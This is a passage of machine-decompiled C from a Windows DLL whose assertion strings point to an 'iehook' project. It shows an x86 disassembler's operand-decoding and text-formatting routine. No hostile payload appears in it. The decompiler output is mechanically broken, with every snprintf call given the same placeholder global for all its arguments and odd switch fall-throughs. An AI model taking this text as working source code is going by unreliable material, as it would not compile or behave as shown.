                                } else {
                                    unsigned char v1041 = *v18; // 0x10009ec7
                                    int32_t v1042 = v1041; // 0x10009ec7
                                    int32_t * v1043 = (int32_t *)(v63 - 4); // 0x10009eea
                                    *v1043 = *(int32_t *)(4 * *v1039 + (int32_t)&g68);
                                    int32_t * v1044 = (int32_t *)(v63 - 8); // 0x10009eeb
                                    *v1044 = v1041 == -1 ? 0 : 256 - v1042;
                                    int32_t * v1045 = (int32_t *)(v63 - 12); // 0x10009ef3
                                    *v1045 = v19 + v1042;
                                    int32_t v1046 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10009ef4
                                    unsigned char v1047 = *v18 + (char)v1046; // 0x10009ef9
                                    *v18 = v1047;
                                    v74 = v69;
                                    v67 = v63;
                                    if ((a3 & 16) == 0) {
                                        goto lab_0x1000af15;
                                    } else {
                                        // 0x10009f12
                                        *(char *)(v19 + (int32_t)v1047) = 123;
                                        *v18 = *v18 + 1;
                                        int32_t v1048 = *v1036; // 0x10009f20
                                        int32_t v1049 = v1048; // 0x10009f26
                                        if ((v1048 & 0xe000) == 0) {
                                            // 0x10009f28
                                            *v1043 = 3926;
                                            *v1044 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                            *v1045 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                            __wassert();
                                            v1049 = *v1036;
                                        }
                                        int32_t v1050 = v1049; // 0x10009f45
                                        if ((v1049 & 0x200000) != 0) {
                                            // 0x10009f47
                                            *(char *)(v19 + (int32_t)*v18) = 114;
                                            *v18 = *v18 + 1;
                                            v1050 = *v1036;
                                        }
                                        int32_t v1051 = v1050; // 0x10009f5f
                                        if ((v1050 & 0x100000) != 0) {
                                            // 0x10009f61
                                            *(char *)(v19 + (int32_t)*v18) = 102;
                                            *v18 = *v18 + 1;
                                            v1051 = *v1036;
                                        }
                                        int32_t v1052 = v1051; // 0x10009f79
                                        if ((v1051 & 1024) != 0) {
                                            // 0x10009f7b
                                            *(char *)(v19 + (int32_t)*v18) = 99;
                                            *v18 = *v18 + 1;
                                            v1052 = *v1036;
                                        }
                                        // 0x10009f8d
                                        v72 = v69;
                                        v61 = v1052;
                                        v65 = v63;
                                        if ((int16_t)v1052 > -1) {
                                            goto lab_0x1000ae34;
                                        } else {
                                            // 0x10009f9a
                                            *(char *)(v19 + (int32_t)*v18) = 88;
                                            v73 = v69;
                                            v66 = v63;
                                            goto lab_0x1000ae47;
                                        }
                                    }
                                }
                            }
                        }
                        case 0xc0000: {
                            // 0x10009b7f
                            if ((*v2 & 8) == 0) {
                                // 0x10009b88
                                *(int32_t *)(v63 - 4) = 3832;
                                *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                *(int32_t *)(v63 - 12) = (int32_t)L"X86Instruction->HasModRM";
                                __wassert();
                            }
                            if ((v6 & 3) != 3) {
                                // 0x1000b312
                                if (v16 != 0) {
                                    goto lab_0x1000af28;
                                } else {
                                    uint32_t v1053 = *v21; // 0x1000b31c
                                    int32_t * v1054 = (int32_t *)(v63 - 4);
                                    *v1054 = v1 + 696;
                                    uint32_t v1055 = *v23 + v1053; // 0x1000b32a
                                    *(int32_t *)(v63 - 8) = *v24 + v1053 / 0x80000000 + (int32_t)(v1055 < v1053);
                                    *(int32_t *)(v63 - 12) = v1055;
                                    *(int32_t *)(v63 - 16) = (int32_t)"[0x%08I64X] ERROR: mod != 3 for AMODE_R (\"%s\")\n";
                                    _printf((char *)&g173);
                                    v803 = v1054;
                                    goto lab_0x1000b50b;
                                }
                            }
                            // 0x10009bb1
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 4) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                int32_t * v1056 = (int32_t *)v79; // 0x10009bbb
                                *v1056 = *v1056 | 128;
                                int16_t * v1057 = (int16_t *)(v79 + 6); // 0x10009bc1
                                uint16_t v1058 = *v1057; // 0x10009bc1
                                g162 = (int32_t)v1058 - 1;
                                switch (v1058) {
                                    case 1: {
                                        int32_t * v1059 = (int32_t *)(v79 + 16); // 0x10009c19
                                        *v1059 = 112;
                                        if (*v31 != 0) {
                                            // 0x10009c29
                                            if (*(int32_t *)(*v27 + 4) == 3) {
                                                // 0x10009c32
                                                *v1059 = 160;
                                            }
                                        }
                                        // break -> 0x10009c39
                                        break;
                                    }
                                    case 2: {
                                        int32_t * v1060 = (int32_t *)(v79 + 16); // 0x10009c00
                                        *v1060 = 128;
                                        *v1060 = *(int32_t *)(*v27 + 4) != 3 ? 128 : 176;
                                        // break -> 0x10009c39
                                        break;
                                    }
                                    case 4: {
                                        int32_t * v1061 = (int32_t *)(v79 + 16); // 0x10009be7
                                        *v1061 = 144;
                                        *v1061 = *(int32_t *)(*v27 + 4) != 3 ? 144 : 192;
                                        // break -> 0x10009c39
                                        break;
                                    }
                                    case 8: {
                                        // 0x10009bd6
                                        *(int32_t *)(v79 + 16) = (int32_t)(v38 | -48);
                                        // break -> 0x10009c39
                                        break;
                                    }
                                    default: {
                                        // 0x1000b34a
                                        *(int32_t *)(v63 - 4) = 3846;
                                        *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                        __wassert();
                                        return 0;
                                    }
                                }
                                // 0x10009c39
                                if ((*v1056 & 0x4000) != 0) {
                                    // 0x10009c41
                                    *(char *)(v30 + (int32_t)(*v29 / 16 & 3)) = v75;
                                    char v1062 = *v29; // 0x10009c55
                                    *v29 = v1062 + 16 & 48 | v1062 & -49;
                                    if (v75 >= 2) {
                                        // 0x10009c75
                                        *(int32_t *)(v63 - 4) = 3848;
                                        *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *(int32_t *)(v63 - 12) = (int32_t)L"OperandIndex < 2";
                                        __wassert();
                                    }
                                    // 0x10009c8f
                                    if (!((v40 != 64 | *v1057 < 2))) {
                                        // 0x10009c9f
                                        *v33 = *v33 | 2048;
                                    }
                                }
                                // 0x10009ca9
                                if ((*v1056 & 0x2000) != 0) {
                                    // 0x10009cb1
                                    *(char *)(((int32_t)(*v29 / 64) | 756) + v1) = v75;
                                    *v29 = *v29 + 64;
                                }
                                // 0x10009cda
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 2) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    unsigned char v1063 = *v18; // 0x10009ce4
                                    int32_t v1064 = v1063; // 0x10009ce4
                                    int32_t v1065 = *(int32_t *)(v79 + 16); // 0x10009cfd
                                    int32_t * v1066 = (int32_t *)(v63 - 4); // 0x10009d07
                                    *v1066 = *(int32_t *)(4 * v1065 + (int32_t)&g68);
                                    int32_t * v1067 = (int32_t *)(v63 - 8); // 0x10009d08
                                    *v1067 = v1063 == -1 ? 0 : 256 - v1064;
                                    int32_t * v1068 = (int32_t *)(v63 - 12); // 0x10009d10
                                    *v1068 = v19 + v1064;
                                    int32_t v1069 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10009d11
                                    unsigned char v1070 = *v18 + (char)v1069; // 0x10009d16
                                    *v18 = v1070;
                                    v74 = v69;
                                    v67 = v63;
                                    if ((a3 & 16) == 0) {
                                        goto lab_0x1000af15;
                                    } else {
                                        // 0x10009d2f
                                        *(char *)(v19 + (int32_t)v1070) = 123;
                                        *v18 = *v18 + 1;
                                        int32_t v1071 = *v1056; // 0x10009d3d
                                        int32_t v1072 = v1071; // 0x10009d43
                                        if ((v1071 & 0xe000) == 0) {
                                            // 0x10009d45
                                            *v1066 = 3852;
                                            *v1067 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                            *v1068 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                            __wassert();
                                            v1072 = *v1056;
                                        }
                                        int32_t v1073 = v1072; // 0x10009d62
                                        if ((v1072 & 0x200000) != 0) {
                                            // 0x10009d64
                                            *(char *)(v19 + (int32_t)*v18) = 114;
                                            *v18 = *v18 + 1;
                                            v1073 = *v1056;
                                        }
                                        int32_t v1074 = v1073; // 0x10009d7c
                                        if ((v1073 & 0x100000) != 0) {
                                            // 0x10009d7e
                                            *(char *)(v19 + (int32_t)*v18) = 102;
                                            *v18 = *v18 + 1;
                                            v1074 = *v1056;
                                        }
                                        int32_t v1075 = v1074; // 0x10009d96
                                        if ((v1074 & 1024) != 0) {
                                            // 0x10009d98
                                            *(char *)(v19 + (int32_t)*v18) = 99;
                                            *v18 = *v18 + 1;
                                            v1075 = *v1056;
                                        }
                                        // 0x10009daa
                                        v72 = v69;
                                        v61 = v1075;
                                        v65 = v63;
                                        if ((int16_t)v1075 > -1) {
                                            goto lab_0x1000ae34;
                                        } else {
                                            // 0x10009db7
                                            *(char *)(v19 + (int32_t)*v18) = 88;
                                            v73 = v69;
                                            v66 = v63;
                                            goto lab_0x1000ae47;
                                        }
                                    }
                                }
                            }
                        }
                        default: {
                            if (v801 != 0xd0000) {
                                // 0x1000b524
                                *(int32_t *)(v63 - 4) = 4063;
                                *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                __wassert();
                                return 0;
                            }
                            // 0x1000996e
                            if ((*v2 & 8) == 0) {
                                // 0x10009977
                                *(int32_t *)(v63 - 4) = 3879;
                                *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                *(int32_t *)(v63 - 12) = (int32_t)L"X86Instruction->HasModRM";
                                __wassert();
                            }
                            // 0x1000998e
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 4) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                int32_t * v1076 = (int32_t *)v79; // 0x10009998
                                int32_t v1077 = *v1076 | 128; // 0x10009998
                                *v1076 = v1077;
                                char v1078 = *v26 & 15;
                                int32_t v1079; // 0x10003490
                                switch (v1078) {
                                    default: {
                                        if (v1078 != 8) {
                                            // 0x1000b2f3
                                            *(int32_t *)(v63 - 4) = 3890;
                                            *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                            *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                            __wassert();
                                            return 0;
                                        }
                                    }
                                    case 2: {
                                    }
                                    case 4: {
                                        // 0x100099bb
                                        v1079 = v1077;
                                        if (v42 < 6) {
                                            // 0x100099c8
                                            *(int32_t *)(v79 + 16) = v43;
                                            v1079 = *v1076;
                                        }
                                        // break -> 0x100099d1
                                        break;
                                    }
                                }
                                // 0x100099d1
                                if ((v1079 & 0x4000) != 0) {
                                    // 0x100099d9
                                    *(char *)(v30 + (int32_t)(*v29 / 16 & 3)) = v75;
                                    char v1080 = *v29; // 0x100099f0
                                    *v29 = v1080 + 16 & 48 | v1080 & -49;
                                    if (v75 >= 2) {
                                        // 0x10009a10
                                        *(int32_t *)(v63 - 4) = 3894;
                                        *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *(int32_t *)(v63 - 12) = (int32_t)L"OperandIndex < 2";
                                        __wassert();
                                    }
                                }
                                // 0x10009a27
                                if ((*v1076 & 0x2000) != 0) {
                                    // 0x10009a2f
                                    *(char *)(((int32_t)(*v29 / 64) | 756) + v1) = v75;
                                    *v29 = *v29 + 64;
                                }
                                // 0x10009a5b
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 2) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    unsigned char v1081 = *v18; // 0x10009a65
                                    int32_t v1082 = v1081; // 0x10009a65
                                    int32_t v1083 = v1081 == -1 ? 0 : 256 - v1082;
                                    int32_t v1084; // 0x10003490
                                    if (v42 < 6) {
                                        int32_t v1085 = *(int32_t *)(v79 + 16); // 0x10009ab6
                                        int32_t v1086 = *(int32_t *)(4 * v1085 + (int32_t)&g68); // 0x10009ab9
                                        *(int32_t *)(v63 - 4) = v1086;
                                        *(int32_t *)(v63 - 8) = v1083;
                                        *(int32_t *)(v63 - 12) = v19 + v1082;
                                        int32_t v1087 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10009aca
                                        v1084 = v1087;
                                    } else {
                                        // 0x10009a70
                                        *(int32_t *)(v63 - 4) = v43;
                                        *(int32_t *)(v63 - 8) = (int32_t)"seg_%02X";
                                        *(int32_t *)(v63 - 12) = v1083;
                                        *(int32_t *)(v63 - 16) = v19 + v1082;
                                        int32_t v1088 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10009a99
                                        v1084 = v1088;
                                    }
                                    unsigned char v1089 = *v18 + (char)v1084; // 0x10009ad2
                                    *v18 = v1089;
                                    v74 = v69;
                                    v67 = v63;
                                    if ((a3 & 16) == 0) {
                                        goto lab_0x1000af15;
                                    } else {
                                        // 0x10009ae2
                                        *(char *)(v19 + (int32_t)v1089) = 123;
                                        *v18 = *v18 + 1;
                                        int32_t v1090 = *v1076; // 0x10009af4
                                        int32_t v1091 = v1090; // 0x10009afa
                                        if ((v1090 & 0xe000) == 0) {
                                            // 0x10009afc
                                            *(int32_t *)(v63 - 4) = 3899;
                                            *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                            *(int32_t *)(v63 - 12) = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                            __wassert();
                                            v1091 = *v1076;
                                        }
                                        int32_t v1092 = v1091; // 0x10009b19
                                        if ((v1091 & 0x200000) != 0) {
                                            // 0x10009b1b
                                            *(char *)(v19 + (int32_t)*v18) = 114;
                                            *v18 = *v18 + 1;
                                            v1092 = *v1076;
                                        }
                                        int32_t v1093 = v1092; // 0x10009b33
                                        if ((v1092 & 0x100000) != 0) {
                                            // 0x10009b35
                                            *(char *)(v19 + (int32_t)*v18) = 102;
                                            *v18 = *v18 + 1;
                                            v1093 = *v1076;
                                        }
                                        int32_t v1094 = v1093; // 0x10009b4d
                                        if ((v1093 & 1024) != 0) {
                                            // 0x10009b4f
                                            *(char *)(v19 + (int32_t)*v18) = 99;
                                            *v18 = *v18 + 1;
                                            v1094 = *v1076;
                                        }
                                        // 0x10009b61
                                        v72 = v69;
                                        v61 = v1094;
                                        v65 = v63;
                                        if ((int16_t)v1094 > -1) {
                                            goto lab_0x1000ae34;
                                        } else {
                                            // 0x10009b6e
                                            *(char *)(v19 + (int32_t)*v18) = 88;
                                            v73 = v69;
                                            v66 = v63;
                                            goto lab_0x1000ae47;
                                        }
                                    }
                                }
                            }
                        }
                    }
                } else {
                    if (v801 == 0xf0000) {
                        // 0x1000a056
                        if ((*v2 & 8) == 0) {
                            // 0x1000a05f
                            *(int32_t *)(v63 - 4) = 3811;
                            *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                            *(int32_t *)(v63 - 12) = (int32_t)L"X86Instruction->HasModRM";
                            __wassert();
                        }
                        // 0x1000a076
                        if ((*v26 & 15) == 2) {
                            // 0x1000b388
                            if (v16 != 0) {
                                goto lab_0x1000af28;
                            } else {
                                int32_t * v1095 = (int32_t *)(v63 - 4);
                                *v1095 = v1 + 696;
                                uint32_t v1096 = *v21; // 0x1000b399
                                uint32_t v1097 = *v23 + v1096; // 0x1000b3a0
                                *(int32_t *)(v63 - 8) = *v24 + v1096 / 0x80000000 + (int32_t)(v1097 < v1096);
                                *(int32_t *)(v63 - 12) = v1097;
                                *(int32_t *)(v63 - 16) = (int32_t)"[0x%08I64X] ERROR: AMODE_P illegal in 16-bit mode (\"%s\")\n";
                                _printf((char *)&g173);
                                v803 = v1095;
                                goto lab_0x1000b50b;
                            }
                        }
                        // 0x1000a088
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            int32_t * v1098 = (int32_t *)v79; // 0x1000a096
                            *v1098 = *v1098 | 128;
                            *(int32_t *)(v79 + 16) = (int32_t)(v42 | 96);
                            v815 = v63;
                            v818 = v69;
                            goto lab_0x1000a0af;
                        }
                    } else {
                        if (v801 != 0x100000) {
                            // 0x1000b524
                            *(int32_t *)(v63 - 4) = 4063;
                            *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                            *(int32_t *)(v63 - 12) = (int32_t)&g3;
                            __wassert();
                            return 0;
                        }
                        // 0x10009fc3
                        if ((*v2 & 8) == 0) {
                            // 0x10009fcc
                            *(int32_t *)(v63 - 4) = 4047;
                            *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                            *(int32_t *)(v63 - 12) = (int32_t)L"X86Instruction->HasModRM";
                            __wassert();
                        }
                        if ((v6 & 3) != 3) {
                            goto lab_0x1000898c;
                        } else {
                            // 0x10009ff5
                            *(int32_t *)(v79 + 16) = v39;
                            int32_t * v1099 = (int32_t *)v79;
                            int32_t v1100 = *v1099; // 0x1000a002
                            *v1099 = v1100 | 128;
                            v806 = v1099;
                            v814 = v63;
                            if ((v1100 & 0x4000) == 0) {
                                goto lab_0x100098f8;
                            } else {
                                // 0x1000a014
                                *(char *)(v30 + (int32_t)(*v29 / 16 & 3)) = v75;
                                char v1101 = *v29; // 0x1000a028
                                *v29 = v1101 + 16 & 48 | v1101 & -49;
                                v806 = v1099;
                                v814 = v63;
                                if (v75 < 2) {
                                    goto lab_0x100098f8;
                                } else {
                                    int32_t v1102 = v63 - 4; // 0x1000a04c
                                    *(int32_t *)v1102 = 4053;
                                    v802 = v1099;
                                    v821 = v1102;
                                    goto lab_0x100098e3;
                                }
                            }
                        }
                    }
                }
            }
        } else {
            if (v801 < 0x140001) {
                switch (v801) {
                    case 0x140000: {
                        // 0x1000a9e5
                        if ((*v2 & 8) == 0) {
                            // 0x1000a9ee
                            *(int32_t *)(v63 - 4) = 3759;
                            *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                            *(int32_t *)(v63 - 12) = (int32_t)L"X86Instruction->HasModRM";
                            __wassert();
                        }
                        if ((v6 & 3) != 3) {
                            // 0x1000b4a3
                            if (v16 != 0) {
                                goto lab_0x1000af28;
                            } else {
                                int32_t * v1103 = (int32_t *)(v63 - 4);
                                *v1103 = v1 + 696;
                                uint32_t v1104 = *v21; // 0x1000b4b0
                                uint32_t v1105 = *v23 + v1104; // 0x1000b4b7
                                *(int32_t *)(v63 - 8) = *v24 + v1104 / 0x80000000 + (int32_t)(v1105 < v1104);
                                *(int32_t *)(v63 - 12) = v1105;
                                *(int32_t *)(v63 - 16) = (int32_t)"[0x%08I64X] ERROR: mod != 3 for AMODE_VR (\"%s\")\n";
                                _printf((char *)&g173);
                                v803 = v1103;
                                goto lab_0x1000b50b;
                            }
                        }
                        // 0x1000aa17
                        if ((*v26 & 15) == 2) {
                            // 0x1000b4d4
                            if (v16 != 0) {
                                goto lab_0x1000af28;
                            } else {
                                uint32_t v1106 = *v21; // 0x1000b4de
                                *(int32_t *)(v63 - 4) = v1 + 696;
                                *(int32_t *)(v63 - 8) = (int32_t)v38;
                                uint32_t v1107 = *v23 + v1106; // 0x1000b4f0
                                int32_t v1108 = *v24; // 0x1000b4f6
                                *(int32_t *)(v63 - 12) = v1108 + v1106 / 0x80000000 + (int32_t)(v1107 < v1106);
                                *(int32_t *)(v63 - 16) = v1107;
                                int32_t v1109 = v63 - 20; // 0x1000b4fe
                                *(int32_t *)v1109 = (int32_t)"[0x%08I64X] ERROR: AMODE_VR illegal in 16-bit mode (\"%s\")\n";
                                v816 = v1109;
                                goto lab_0x1000b503;
                            }
                        }
                        // 0x1000aa27
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            int32_t * v1110 = (int32_t *)v79; // 0x1000aa35
                            *v1110 = *v1110 | 128;
                            int32_t * v1111 = (int32_t *)(v79 + 16); // 0x1000aa41
                            *v1111 = v39;
                            if ((*v1110 & 0x4000) != 0) {
                                // 0x1000aa4c
                                *(char *)(v30 + (int32_t)(*v29 / 16 & 3)) = v75;
                                char v1112 = *v29; // 0x1000aa60
                                *v29 = v1112 + 16 & 48 | v1112 & -49;
                                if (v75 >= 2) {
                                    // 0x1000aa80
                                    *(int32_t *)(v63 - 4) = 3774;
                                    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                    *(int32_t *)(v63 - 12) = (int32_t)L"OperandIndex < 2";
                                    __wassert();
                                }
                            }
                            // 0x1000aa9a
                            if ((*v1110 & 0x2000) != 0) {
                                // 0x1000aaa2
                                *(char *)(((int32_t)(*v29 / 64) | 756) + v1) = v75;
                                *v29 = *v29 + 64;
                            }
                            // 0x1000aacb
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v1113 = *v18; // 0x1000aad5
                                int32_t v1114 = v1113; // 0x1000aad5
                                int32_t * v1115 = (int32_t *)(v63 - 4); // 0x1000aaf8
                                *v1115 = *(int32_t *)(4 * *v1111 + (int32_t)&g68);
                                int32_t * v1116 = (int32_t *)(v63 - 8); // 0x1000aaf9
                                *v1116 = v1113 == -1 ? 0 : 256 - v1114;
                                int32_t * v1117 = (int32_t *)(v63 - 12); // 0x1000ab01
                                *v1117 = v19 + v1114;
                                int32_t v1118 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000ab02
                                unsigned char v1119 = *v18 + (char)v1118; // 0x1000ab07
                                *v18 = v1119;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x1000ab20
                                    *(char *)(v19 + (int32_t)v1119) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t v1120 = *v1110; // 0x1000ab2e
                                    int32_t v1121 = v1120; // 0x1000ab34
                                    if ((v1120 & 0xe000) == 0) {
                                        // 0x1000ab36
                                        *v1115 = 3779;
                                        *v1116 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v1117 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v1121 = *v1110;
                                    }
                                    int32_t v1122 = v1121; // 0x1000ab53
                                    if ((v1121 & 0x200000) != 0) {
                                        // 0x1000ab55
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v1122 = *v1110;
                                    }
                                    int32_t v1123 = v1122; // 0x1000ab6d
                                    if ((v1122 & 0x100000) != 0) {
                                        // 0x1000ab6f
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v1123 = *v1110;
                                    }
                                    int32_t v1124 = v1123; // 0x1000ab87
                                    if ((v1123 & 1024) != 0) {
                                        // 0x1000ab89
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v1124 = *v1110;
                                    }
                                    // 0x1000ab9b
                                    v72 = v69;
                                    v61 = v1124;
                                    v65 = v63;
                                    if ((int16_t)v1124 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x1000aba8
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 0x120000: {
                        // 0x1000a759
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            int32_t * v1125 = (int32_t *)v79; // 0x1000a763
                            *v1125 = *v1125 | 0x10080;
                            char * v1126 = (char *)(v79 + 4); // 0x1000a769
                            *v1126 = *v1126 & -64 | 5;
                            unsigned char v1127 = *v26; // 0x1000a775
                            int32_t * v1128; // 0x10003490
                            int32_t v1129; // 0x10003490
                            if ((v1127 & -16) == 32) {
                                int32_t * v1130 = (int32_t *)(v79 + 16);
                                *v1130 = 135;
                                v1129 = 135;
                                v1128 = v1130;
                            } else {
                                int32_t v1131 = (int32_t)(v1127 / 16) - 4; // 0x1000a784
                                if (v1131 == 0) {
                                    int32_t * v1132 = (int32_t *)(v79 + 16);
                                    *v1132 = 151;
                                    v1129 = 151;
                                    v1128 = v1132;
                                } else {
                                    if (v1131 != 4) {
                                        // 0x1000b484
                                        *(int32_t *)(v63 - 4) = 3691;
                                        *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                        __wassert();
                                        return 0;
                                    }
                                    int32_t * v1133 = (int32_t *)(v79 + 16);
                                    *v1133 = 215;
                                    v1129 = 215;
                                    v1128 = v1133;
                                }
                            }
                            int32_t * v1134 = v1128;
                            *v35 = v1129;
                            char v1135 = *v2; // 0x1000a7b4
                            char v1136 = v1135 | 16; // 0x1000a7b4
                            *v2 = v1136;
                            int32_t v1137 = *v1125; // 0x1000a7bb
                            int32_t v1138 = v1137; // 0x1000a7c7
                            if ((v1137 & 0x4000) != 0) {
                                char v1139 = v1136; // 0x1000a7cb
                                if ((v1135 & 2) != 0) {
                                    // 0x1000a7cd
                                    *(int32_t *)(v63 - 4) = 3696;
                                    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                    *(int32_t *)(v63 - 12) = (int32_t)L"!X86Instruction->HasDstAddressing";
                                    __wassert();
                                    v1139 = *v2;
                                }
                                // 0x1000a7e7
                                *v2 = v1139 | 2;
                                *(char *)(v30 + (int32_t)(*v29 / 16 & 3)) = v75;
                                char v1140 = *v29; // 0x1000a802
                                *v29 = v1140 & -52 | v75 & 3 | v1140 + 16 & 48;
                                v1138 = *v1125;
                            }
                            // 0x1000a823
                            if ((v1138 & 0x2000) != 0) {
                                // 0x1000a82b
                                if (*v34 != 0x4001) {
                                    // 0x1000a837
                                    if ((*v2 & 4) != 0) {
                                        // 0x1000a840
                                        *(int32_t *)(v63 - 4) = 3696;
                                        *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *(int32_t *)(v63 - 12) = (int32_t)L"!X86Instruction->HasSrcAddressing";
                                        __wassert();
                                    }
                                }
                                // 0x1000a85a
                                *v2 = *v2 | 4;
                                *(char *)(((int32_t)(*v29 / 64) | 756) + v1) = v75;
                                char v1141 = *v29; // 0x1000a872
                                *v29 = v1141 & 51 | 4 * v75 & 12 | v1141 + 64 & -64;
                            }
                            // 0x1000a896
                            if ((*v28 & 8) == 0) {
                                // 0x1000a8e8
                                *v37 = 0;
                            } else {
                                char v1142 = *v25; // 0x1000a89f
                                if ((v1142 & 16) == 0) {
                                    char v1143 = v1142; // 0x1000a8ac
                                    if (v16 == 0) {
                                        uint32_t v1144 = *v21; // 0x1000a8ae
                                        uint32_t v1145 = *v23 + v1144; // 0x1000a8b5
                                        *(int32_t *)(v63 - 4) = *v24 + v1144 / 0x80000000 + (int32_t)(v1145 < v1144);
                                        *(int32_t *)(v63 - 8) = v1145;
                                        *(int32_t *)(v63 - 12) = (int32_t)"[0x%08I64X] ANOMALY: segment override used with AMODE_Y\n";
                                        _printf((char *)&g173);
                                        v1143 = *v25;
                                    }
                                    // 0x1000a8d0
                                    *v25 = v1143 | 16;
                                }
                                // 0x1000a8d7
                                *(int32_t *)(v1 + 748) = 0;
                                *v2 = *v2 | -128;
                            }
                            // 0x1000a8f0
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v1146 = *v18; // 0x1000a8f9
                                int32_t v1147 = v1146; // 0x1000a8f9
                                int32_t v1148 = *(int32_t *)(4 * *v1134 + (int32_t)&g68); // 0x1000a911
                                int32_t * v1149 = (int32_t *)(v63 - 4); // 0x1000a918
                                *v1149 = v1148;
                                int32_t * v1150 = (int32_t *)(v63 - 8); // 0x1000a91f
                                *v1150 = *(int32_t *)&g46;
                                int32_t * v1151 = (int32_t *)(v63 - 12); // 0x1000a920
                                *v1151 = (int32_t)"%s:[%s]";
                                *(int32_t *)(v63 - 16) = v1146 == -1 ? 0 : 256 - v1147;
                                *(int32_t *)(v63 - 20) = v19 + v1147;
                                int32_t v1152 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000a92e
                                unsigned char v1153 = *v18 + (char)v1152; // 0x1000a933
                                *v18 = v1153;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x1000a94c
                                    *(char *)(v19 + (int32_t)v1153) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t v1154 = *v1125; // 0x1000a95a
                                    int32_t v1155 = v1154; // 0x1000a960
                                    if ((v1154 & 0xe000) == 0) {
                                        // 0x1000a962
                                        *v1149 = 3717;
                                        *v1150 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v1151 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v1155 = *v1125;
                                    }
                                    int32_t v1156 = v1155; // 0x1000a97f
                                    if ((v1155 & 0x200000) != 0) {
                                        // 0x1000a981
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v1156 = *v1125;
                                    }
